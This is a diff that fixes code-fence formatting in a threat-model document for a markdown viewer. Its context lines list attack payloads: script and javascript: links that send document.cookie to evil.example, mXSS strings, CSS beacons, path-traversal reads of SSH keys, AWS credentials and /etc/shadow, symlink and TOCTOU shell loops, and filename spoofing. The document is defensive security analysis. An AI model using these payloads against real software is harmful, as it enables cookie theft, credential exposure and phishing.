@@ -145,7 +145,7 @@ flowchart TB
 
     style EFFECTS fill:#7f1d1d22,stroke:#b91c1c
     style TRANSFORM fill:#1f6feb22,stroke:#1f6feb
-```text
+```
 
 **Key observation from the diagram:** stages `decode` through `highlight` have no
 outgoing arrows to the side-effecting surfaces except through an explicit,
@@ -173,11 +173,11 @@ it is a security change and needs review. That is the rule.
 
 ````markdown
 <script>fetch('https://evil.example/?d='+encodeURIComponent(document.cookie))</script>
-````text
+````
 
 ````markdown
 <img src=x onerror="require('child_process').exec('calc')">
-````text
+````
 
 ```markdown
 <a href="#" onclick="fetch('https://evil.example/x')">click</a>
@@ -212,15 +212,15 @@ becomes active when the string is serialized and reparsed.
 
 ```html
 <svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>
-```text
+```
 
 ```html
 <math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
-```text
+```
 
 ```html
 <svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>
-```text
+```
 
 ```html
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
@@ -248,15 +248,15 @@ happens when an application re-contextualizes the output.
 
 ```markdown
 [click](javascript:fetch('https://evil.example/?'+document.cookie))
-```text
+```
 
 ```markdown
 [click](vbscript:msgbox(1))
-```text
+```
 
 ```markdown
 [x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
-```text
+```
 
 ```markdown
 [click](jav&#x09;ascript:alert(1))
@@ -264,11 +264,11 @@ happens when an application re-contextualizes the output.
 
 ```markdown
 [click](java%0ascript:alert(1))
-```text
+```
 
 ```markdown
 [![](x)](  javascript:alert(1)  )
-```text
+```
 
 **Impact.** Script execution on click; data exfiltration; navigation of the
 app window to a phishing page.
@@ -294,7 +294,7 @@ image source, then observe it.
 
 ````markdown
 ![](../../../../.ssh/id_rsa)
-````text
+````
 
 ````markdown
 ![](file:///C:/Users/victim/.aws/credentials)
@@ -302,15 +302,15 @@ image source, then observe it.
 
 ````markdown
 ![](../../../Windows/win.ini)
-````text
+````
 
 ````markdown
 ![](\\\\evil-server\\share\\secret.png)
-````text
+````
 
 ```markdown
 ![](/etc/shadow)
-```text
+```
 
 ```markdown
 ![](..%5c..%5c..%5cUsers%5cvictim%5c.id_rsa)
@@ -318,7 +318,7 @@ image source, then observe it.
 
 ```markdown
 ![](../../secret.png::$DATA)
-```text
+```
 
 The last one is not hypothetical: [CVE-2026-53571](https://www.sentinelone.com/vulnerability-database/cve-2026-53571)
 is a Windows path-deny-list bypass in Vite's dev server using exactly
@@ -336,7 +336,7 @@ an image decoder will render, the bytes are in the renderer's memory.
 to the document's real directory *and* to the set of roots the user has opened;
 a separate extension allowlist (`png jpg jpeg gif webp bmp svg ico avif`); refusal
 of `file:` URLs, absolute paths, and UNC paths; a size cap; and a dimension cap.
-Full treatment in [03-filesystem-safety.md §2](./03-filesystem-safety.md#2-path-traversal-the-windows-special-cases).
+Full treatment in [03-filesystem-safety.md §2](./03-filesystem-safety.md#2-path-traversal-and-the-windows-special-cases).
 
 **Residual risk.** TOCTOU: a symlink swapped between the `realpath` check and the
 `open`. Mitigated by opening the resolved path with `O_NOFOLLOW`-style semantics
@@ -376,7 +376,7 @@ property off `document`, `window`, or a form element obtained from the document.
 
 ```html
 <style>@import url('https://evil.example/leak.css');</style>
-```text
+```
 
 ```html
 <div style="background-image:url(https://evil.example/p.gif?d=1)">text</div>
@@ -384,7 +384,7 @@ property off `document`, `window`, or a form element obtained from the document.
 
 ```html
 <a href="#" style="position:fixed;inset:0;opacity:0;z-index:99999">
-```text
+```
 
 **Impact.** Beacon / IP disclosure; UI overlay for clickjacking; attribute-selector
 exfiltration (`input[value^="a"]{background:url(//evil/a)}`) if forms were present.
@@ -435,7 +435,7 @@ not sticky across documents.
 ```markdown
 [x]: x
 \[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](%5C%5B%5C%5D(%60))
-```text
+```
 
 For quadratic (O(n²)) rather than exponential behaviour, from
 [CVE-2026-48988](https://nvd.nist.gov/vuln/detail/CVE-2026-48988)
@@ -449,7 +449,7 @@ And a nesting-depth payload targeting parser *and* sanitizer limits:
 
 ```html
 <svg><svg><svg>…<!-- ×8192 --><style><img src=x onerror=alert(1)></style>
-```text
+```
 
 **Impact.** UI freeze; on the desktop, an unresponsive window the user kills.
 The mXSS dimension of the nesting payload matters too: past the parser's depth
@@ -486,7 +486,7 @@ then assigned via `innerHTML`, with one branch using `textContent` **as HTML**):
 
 ```html
 <a href="https://evil.example/">https://evil.example/</a>
-```text
+```
 
 **Impact.** RCE. [CVE-2023-2318](https://nvd.nist.gov/vuln/detail/CVE-2023-2318)
 was `require("child_process").exec("gnome-calculator -e 'MarkText RCE PoC'")`,
@@ -537,7 +537,7 @@ different application or a permission prompt.
 
 ````markdown
 <script>document.title = 'Siyana — Grant Full Disk Access to continue reading'</script>
-````text
+````
 
 **Impact.** Phishing with a legitimate application's chrome.
 
@@ -579,7 +579,7 @@ write, or execute.
 # A7 plants this where our watcher will see it
 ln -s /home/victim/.ssh/id_rsa ~/notes/innocent.md
 ln -s /etc/shadow ~/notes/totally-fine.md
-```text
+```
 
 ```bash
 # Symlink loop to hang a recursive directory walk
@@ -589,7 +589,7 @@ mkdir -p ~/notes/a && ln -s ~/notes ~/notes/a/loop
 ```bash
 # TOCTOU: swap the file between our check and our read
 while :; do echo 'pwned' > /tmp/x.md; rm /tmp/x.md; ln -s ~/.ssh/id_rsa /tmp/x.md; done
-```text
+```
 
 **Impact.** Confidentiality via symlinked documents; availability via symlink
 loops in a directory walk; integrity via TOCTOU.
@@ -611,9 +611,9 @@ this is mostly a Linux concern. Junction points and hard links remain possible.
 
 **Payload.**
 
-```
+```bash
 mv notes.md notes.md.tmp && printf '# Half-written' > notes.md && mv notes.md.tmp notes.md &
-```text
+```
 
 Editor behaviours that produce garbage rather than an attack: write-in-place
 (truncate then write — we see a partial file), atomic-rename (we either see the
@@ -657,29 +657,29 @@ names zip-slip explicitly.
 
 **Payloads.**
 
-```
-../../../../etc/passwd.md
 ```text
-
+../../../../etc/passwd.md
 ```
+
+```text
 CON.md
 NUL.md
 COM1.md
 aux.md          (Windows reserved device names)
-```text
-
 ```
+
+```text
 notes.md::$DATA
-```text
-
 ```
+
+```text
 notes
 .‮gnp.exe.md    (U+202E RIGHT-TO-LEFT OVERRIDE — displays as "notes.exe.md")
-```text
-
 ```
-README.md      (U+200B zero-width spaces — invisible, looks like "README.md")
+
 ```text
+README.md      (U+200B zero-width spaces — invisible, looks like "README.md")
+```
 
 **Impact.** Path traversal via the file-open path; UI spoofing and
 extension-confusion via bidi/zero-width characters; device-path access on Windows.
